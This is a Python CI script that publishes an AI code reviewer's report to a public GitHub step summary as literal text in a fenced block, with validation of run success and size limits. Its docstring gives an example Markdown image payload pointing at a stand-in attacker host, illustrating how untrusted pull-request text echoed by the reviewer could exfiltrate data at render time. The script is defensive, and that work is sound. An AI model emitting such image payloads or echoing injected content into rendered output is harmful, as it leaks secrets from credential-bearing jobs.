"""Publish the reviewer's report to the step summary without render-time fetches.

The mention job holds a credential and its step summary is public. The pinned action's
own `display_report` input warns that it "outputs Claude-authored content in the GitHub
Step Summary" and "should only be used in cases where the action is used solely with
trusted input" -- and this job's input is a candidate Pull Request, which is untrusted by
definition.

The concrete hazard is not that the report might be wrong. It is that a step summary
renders Markdown, including images, so a report that echoes attacker-supplied text can
carry `![](https://attacker/?q=...)`, which the browser fetches when the page is
rendered, with no click. That is an exfiltration channel out of a credential-bearing
job, and it is the one channel none of the other controls in Decision 0094 touch: they
all govern what the reviewer *reads*, not what it *publishes*.

So the action's own rendering is disabled and the report is published here instead, as
**literal text inside one fenced code block that this script owns**. Nothing inside a
code fence is interpreted as Markdown or HTML, so no image, no `<img>`, no link and no
scheme in the report can cause a fetch -- there is nothing to neutralise line by line.

That shape replaced one that scanned for fences and escaped only the lines it believed
were outside them. It was wrong twice, and the second time is the instructive one: a
fence opened inside a list item (`- a` then two spaces and a fence) is closed by the
next unindented line, because that line cannot continue the item lazily. Markdown left
the code block; the scanner did not, and passed an image through. The scanner was
reimplementing CommonMark block structure, and every fix made it a slightly better
implementation of the wrong thing. The fence is chosen **longer than the longest run of
backticks anywhere in the report**, so no line in it can close the block -- one
invariant, checkable in one line, rather than a container-aware parser.

The cost is real and is accepted: the report renders as monospace text, so its headings
are not headings and its `file:line` references are not links. A report whose content is
exact and unrendered is worth more here than a rendered one whose safety rests on
matching another parser's block structure.

Bounded, too: a report is truncated with a notice rather than pasted at any length.

Invoked from `.github/workflows/claude.yml`, which for the mention triggers runs from
the repository's default branch, so this file is not candidate-supplied.
"""

from __future__ import annotations

import json
import pathlib
import re
import sys
from typing import Any

from review_context_paths import within

_MAX_BYTES = 65536
# The execution file holds every turn, not just the report, so its bound is larger.
_MAX_EXECUTION_BYTES = 8 * 1024 * 1024
_MIN_FENCE = 3
_BACKTICK_RUN = re.compile(r"`+")


def run_succeeded(turns: list[Any]) -> bool:
    """Return whether the execution stream ends in a successful result envelope.

    The heading the summary publishes is a claim about the run, not only about the
    text. A reviewer that hits the turn limit or errors after emitting text still
    produces a result turn -- carrying ``is_error: true`` or a non-success subtype, and
    often a diagnostic string where the report would be. Accepting it on its text alone
    published a run that never finished under "Claude review report".

    Success must be stated, never inferred from the absence of a failure signal. The
    native envelope carries `subtype: "success"` with `is_error: false` on a run that
    finished -- this repository established that in
    `knowledge/assessments/native-structured-review-handoff.md`, whose declared
    `claude-structured` adapter requires exactly that pair, and which retains a mutant
    (`M1-ignore-success-subtype-isolated`) showing that ignoring the success subtype
    produces three assertion failures against its oracle.

    So an envelope without a subtype is *unknown*, not successful, and an earlier
    version of this function admitting `subtype is None` was the same defect that
    mutant demonstrates. It was also inconsistent with the line below it: a stream with
    no result envelope at all was already reported as unfinished, and an envelope that
    declares nothing says no more than no envelope does.
    """
    # Exactly one envelope, as this repository's native adapter requires ("No unique
    # successful Claude result"). With two, the status came from one and the text
    # could come from another, so an error diagnostic followed by an empty success
    # was published as a finished review.
    results = [t for t in turns if isinstance(t, dict) and t.get("type") == "result"]
    if len(results) != 1:
        return False
    (only,) = results
    # And it ends the stream. The pinned action breaks on the first result, so a real
    # execution file never has a turn after it; one that does is not what the action
    # writes, and its status cannot be trusted.
    if turns[-1] is not only:
        return False
    # `is False`, not falsiness: a missing, null or zero flag is the absence of a
    # failure signal, which is exactly what the rule above refuses.
    return only.get("is_error") is False and only.get("subtype") == "success"


def final_report(turns: list[Any]) -> tuple[str, bool]:
    """Return the reviewer's final text, and whether the run that produced it finished.

    The two travel together because the caller cannot recover the second from the
    first: a diagnostic and a report are both non-empty strings.
    """
    complete = run_succeeded(turns)
    for turn in reversed(turns):
        if not isinstance(turn, dict):
            continue
        result = turn.get("result")
        # A result turn carrying an empty string is not a report. Returning it shadowed
        # real assistant text and published "the reviewer produced no final text".
        if turn.get("type") == "result" and isinstance(result, str) and result.strip():
            return result, complete
    # Fall back to the last assistant text block -- the assistant's, and only its
    # text blocks. Any turn with message text used to qualify, so a user or tool
    # turn's text, which is the reviewer's *input*, could be published as its report.
    for turn in reversed(turns):
        if not isinstance(turn, dict) or turn.get("type") != "assistant":
            continue
        message = turn.get("message")
        content = message.get("content") if isinstance(message, dict) else None
        if not isinstance(content, list):
            continue
        texts = [
            block["text"]
            for block in content
            if isinstance(block, dict)
            and block.get("type") == "text"
            and isinstance(block.get("text"), str)
        ]
        if texts:
            return "\n".join(texts), complete
    return "", complete


def enclosing_fence(text: str) -> str:
    """Return a backtick fence no line of ``text`` can close.

    CommonMark closes a fenced block at a line whose first non-space run is the same
    character and **at least as long** as the opening one. A fence longer than the
    longest run of backticks anywhere in ``text`` therefore has no possible closing
    line, whatever containers -- lists, blockquotes -- the text puts around it.
    """
    longest = max((len(run) for run in _BACKTICK_RUN.findall(text)), default=0)
    return "`" * max(_MIN_FENCE, longest + 1)


def neutralise(text: str) -> str:
    """Return ``text`` as literal content of a fenced block nothing can escape."""
    fence = enclosing_fence(text)
    # `text` as the info string, so a renderer applies no syntax highlighting and, more
    # to the point, treats the content as data rather than as a language it knows.
    return f"{fence}text\n{text}\n{fence}"


def render(execution_file: pathlib.Path) -> str:
    """Return the publishable report for ``execution_file``."""
    try:
        # Checked before the parse. The report is bounded at _MAX_BYTES, but the whole
        # execution file was materialised first, so an oversized one consumed runner
        # memory before any bound applied -- a bound that arrives after the cost is not
        # a bound.
        if execution_file.stat().st_size > _MAX_EXECUTION_BYTES:
            return (
                "## Review report unavailable\n\n"
                f"The execution output is too large to publish safely "
                f"({execution_file.stat().st_size} bytes, limit "
                f"{_MAX_EXECUTION_BYTES}). The job's logs hold it.\n"
            )
        turns = json.loads(execution_file.read_text(encoding="utf-8"))
    except (OSError, ValueError) as error:
        return f"## Review report unavailable\n\nCould not read the execution output: {error}\n"
    if not isinstance(turns, list):
        return "## Review report unavailable\n\nThe execution output was not a list of turns.\n"
    report, complete = final_report(turns)
    if not report.strip():
        return "## Review report unavailable\n\nThe reviewer produced no final text.\n"
    # Truncated *before* the block is built, so the cut can never land inside the
    # closing fence and leave the rest of the summary inside an unterminated block.
    encoded = report.encode("utf-8")
    if len(encoded) > _MAX_BYTES:
        report = encoded[:_MAX_BYTES].decode("utf-8", "ignore")
        report += f"\n\n[report truncated at {_MAX_BYTES} bytes]"
    if not complete:
        # The text is still shown -- it is the only evidence of what the run did -- but
        # never under a heading that calls it the review. A diagnostic and a report are
        # both non-empty strings, so the heading is the only thing that distinguishes
        # them for the reader.
        return (
            "## Review incomplete\n\n"
            "The reviewer did not finish: its execution ended without a successful\n"
            "result. What follows is the last text it produced, which may be a\n"
            "diagnostic or partial narration rather than findings. Treat the change as\n"
            "not reviewed.\n\n"
            f"{neutralise(report)}\n"
        )
    return (
        "## Claude review report\n\n"
        "Published by the repository, not by the action. The report is shown as literal\n"
        "text: a step summary is public and renders Markdown, so an image in reviewer\n"
        "output would be fetched at render time.\n\n"
        f"{neutralise(report)}\n"
    )


def main(argv: list[str]) -> int:
    if len(argv) != 3:
        print(f"usage: {argv[0]} <execution-file> <summary-file>", file=sys.stderr)
        return 2
    # The step no longer gates on the action having produced an execution file, so this
    # has to handle its absence. Confining a path that does not exist, or refusing an
    # empty one, would crash here and publish nothing -- the same silent failure the
    # gate removal was meant to end, one layer down. `render` already reports an
    # unreadable file, so the path is confined without requiring it to exist.
    raw = argv[1]
    if not raw.strip():
        summary_only = within(argv[2], "", must_exist=False)
        with summary_only.open("a", encoding="utf-8") as handle:
            # The heading every other unavailable case uses. "Claude review report"
            # is reserved for a finished review, and a reader scans headings.
            handle.write(
                "## Review report unavailable\n\n"
                "The reviewer produced no execution output: it failed before writing\n"
                "one, so there is nothing to publish. The job's logs hold the reason.\n"
            )
        return 0
    execution = within(raw, "RUNNER_TEMP", must_exist=False)
    # The summary path is not held to a root. GITHUB_STEP_SUMMARY happens to live under
    # RUNNER_TEMP on today's hosted runners, but that is an implementation detail, and
    # refusing the report because the runner moved a file would lose the review over an
    # assumption about its layout. It is still resolved, required to be absolute with an
    # existing parent, and refused if it traverses.
    summary = within(argv[2], "", must_exist=False)
    with summary.open("a", encoding="utf-8") as handle:
        handle.write(render(execution))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
